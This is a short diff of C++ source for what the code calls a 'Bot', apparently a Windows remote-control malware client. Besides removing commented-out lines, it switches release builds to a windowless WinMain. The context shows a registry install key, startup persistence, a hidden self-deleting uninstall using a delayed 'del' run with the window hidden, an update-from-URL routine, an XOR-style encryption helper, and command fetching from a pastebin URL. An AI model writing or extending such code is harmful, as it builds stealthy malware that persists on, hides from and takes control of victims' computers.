@@ -240,7 +240,6 @@ void removeRegInstallKey(){
 void uninstall() {
 	removeRegInstallKey();
 	std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
-	//ShellExecute(GetDesktopWindow(), "open", remove.c_str(), NULL, NULL, SW_SHOWNORMAL);
 	ShellExecute(
 		NULL,
 		_T("open"),
@@ -248,9 +247,6 @@ void uninstall() {
 		_T( remove.c_str() ), // params                            
 		_T(" C:\ "),
 		SW_HIDE);
-	//std::string remove = "START /B CMD.EXE /D /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
-	//std::cout << remove;
-	//system(remove.c_str());
 }
 
 void update(std::string url) {
@@ -395,9 +391,12 @@ std::string encryptDecrypt(std::string toEncrypt) {
 
 
 
-
-//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
-int main(int argc, char *argv[]) {
+#if _DEBUG
+	int main(int argc, char* argv[]) {
+#endif
+#if NDEBUG 
+	int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
+#endif
 	Config config;
 
 	//Check if the Bot is Running
@@ -414,7 +413,6 @@ int main(int argc, char *argv[]) {
 		}
 		addstartup();
 	}
-
 
 	//Main
 	http::Request request(config.pastebinUrl);
